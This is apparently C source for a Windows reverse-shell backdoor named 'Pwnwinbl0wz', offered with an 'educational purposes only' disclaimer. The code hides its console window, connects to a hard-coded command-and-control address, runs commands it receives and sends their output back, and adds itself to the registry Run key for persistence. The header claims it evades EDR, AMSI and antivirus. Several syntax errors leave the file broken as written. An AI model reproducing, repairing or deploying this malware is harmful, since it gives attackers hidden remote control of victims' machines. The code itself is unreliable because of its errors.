/////////////////////////////////////////////////////////////////////////////
/*  Pwnwinbl0wz backdoor 4 windows we use winsock/wininet/windowsx 
 *  * =========== Author: Emirhan Sarikaya ============                             
 *  *     =========== Date: 8/21/2021 ============ 
 *  *    ======  EDUCATIONAL PURPOSES ONLY!  ======
 * 
 *  ====== I AM NOT RESPONSIBLE FOR ANY HARM CAUSED BY THIS ======
 * 
 *  Tested on: Windows 7/8/10 / Windows Server 2012 R2/R1
 *  This backdoor bypasses most EDR / AMSI and AV's including Windows defender
 */
/////////////////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////////////////
// -- Compile with MINGW for winblowz machine
// -- We compile for 32-bit because it can be run on 32-bit&64-bit also :)
// -----------------------------------------
//
//    i686-w64-mingw32-gcc -o malwr.exe malwr.c -lwsock32 -lwininet
//
// -----------------------------------------
/////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <windowsx.h>
#include <winbase.h>
#include <sys/stat.h>
#include <sys/types.h>

#define fuqbillgatez(p, size) (void)memset((p), 0, (size))

int s0ck1t;

/* makes a registry key of this malware 4 persistence */
int runStartup()
{
    char fuckedup[128] = "[Pwnbl0wz] Fuckedup coudlnt hodl myself on system \n";
    char aight[128] = "[Pwnbl0wz] Persisted myself! : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    TCHAR fqPath[MAX_PATH]; // on winblowz 256 character MAX_PATH
    DWORD lengthPath = 0;   // unsigned 32-bit data

    lengthPath = GetModuleFileName(NULL, fqPath, MAX_PATH);
    if (lengthPath == 0)
    {
        send(s0ck1t, fuckedup, sizeof(fuckedup), 0);
        return -1;
    }
    HKEY registryVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &registryVal) != ERROR_SUCCESS) {
        send(s0ck1t, fuckedup, sizeof(fuckedup), 0);
        return -1;
    }

    DWORD lengthLocationByte = lengthPath * sizeof(*fqPath);
    if(RegSetValueEx(registryVal, TEXT("[Pwnbl0wz] Adding to registry..."), 0, REG_SZ, (LPBYTE)fqPath, lengthLocationByte) != ERROR_SUCCESS) {
        RegCloseKey(registryVal); // If it doesnt work, u should close the key!
        send(s0ck1t, fuckedup, sizeof(fuckedup), 0);
        return -1;
    }
    RegCloseKey(registryVal);
    send(s0ck1t, aight, sizeof(aight), 0);
    return 0;
}

char *
m4hm0udg0r1ll4(char str[], int sh0utzm1tn1ck, int t0m1tn1ck)
{
    if (str[0] == '\0')
        return NULL;
    char *buffer;
    size_t str_len, buffer_len;

    if (t0m1tn1ck < 0 && sh0utzm1tn1ck > t0m1tn1ck)
    {
        str_len = strlen(str);
        if (abs(t0m1tn1ck) > str_len - 1)
            return NULL;
        if (abs(sh0utzm1tn1ck) > str_len)
            sh0utzm1tn1ck = (-1) * str_len;

        buffer_len = t0m1tn1ck - sh0utzm1tn1ck;
        str += (str_len + sh0utzm1tn1ck);
    }
    else if (sh0utzm1tn1ck > str_len - 1)
        return NULL;
    buffer_len = t0m1tn1ck - sh0utzm1tn1ck;
    str += sh0utzm1tn1ck;
}
else return NULL;

buffer = calloc(buffer_len, sizeof(char));
strncpy(buffer, str, buffer_len);
return buffer;

void CE_execute()
{
    char buffer[1024];
    char cont[1024];
    char respons[18384];

    while (true)
    {
    jump:
        fuqbillgatez(buffer, sizeof(buffer));
        fuqbillgatez(cont, sizeof(cont));
        fuqbillgatez(respons, sizeof(respons));
        recv(s0ck1t, buffer, 1024, 0);
        if (strncmp("q", buffer, 1) == 0)
        {
            closesocket(s0ck1t);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0)
        {
            chdir(m4hm0udg0r1ll4(buffer, 3, 100));
        }
        else if (strncmp("hodlme", buffer, 6) == 0)
        {
            runStartup();
        }
        else
        {
            FILE *m1tn1ck;
            /*m1tn1ck = fopen();*/
            m1tn1ck = _popen(buffer, "r") // read buffer & exec PID
                while (fgets(cont, 1024, fp) != NULL)
            {
                strcat(respons, cont);
            }
            send(s0ck1t, respons, sizeof(respons), 0);
            fclose(m1tn1ck);
        }
    }
}

/* w1nbl0wzMain hides the window of backdoor */
int APIENTRY w1nbl0wzMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    HWND pwnstealthy;
    AllocConsole(); // This wil allocate new function 2 console
    pwnstealthy = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(pwnstealthy, 0); // nCmdShow = 0 so it hides the window

    struct sockaddr_in C2_server;
    unsigned short C2_port;
    char *C2_IP; // pointer 2 memory addy
    WSADATA w1nbl0wzData;

    C2_IP = "1.3.3.7"; // c2 ip addy here
    C2_port = 1337;    // c2 listener port

    /* this function initiates use of winsock DLL */
    if (WSAStartup(MAKEWORD(2, 0), &w1nbl0wzData) != 0)
    {
        exit(1);
    }

    s0ck1t = socket(AF_INET, SOCK_STREAM, 0);
    memset(&C2_server, 0, sizeof(C2_server));
    C2_server.sin_family = AF_INET;
    C2_server.sin_addr.s_addr = inet_addr(C2_IP);
    C2_server.sin_port = htons(C2_port);

overagain:
    while (connect(s0ck1tm(struct sockaddr *) & C2_server, sizeof(C2_server)) != 0)
    {
        Sleep(5);
        goto overagain;
    }
    CE_execute();
}
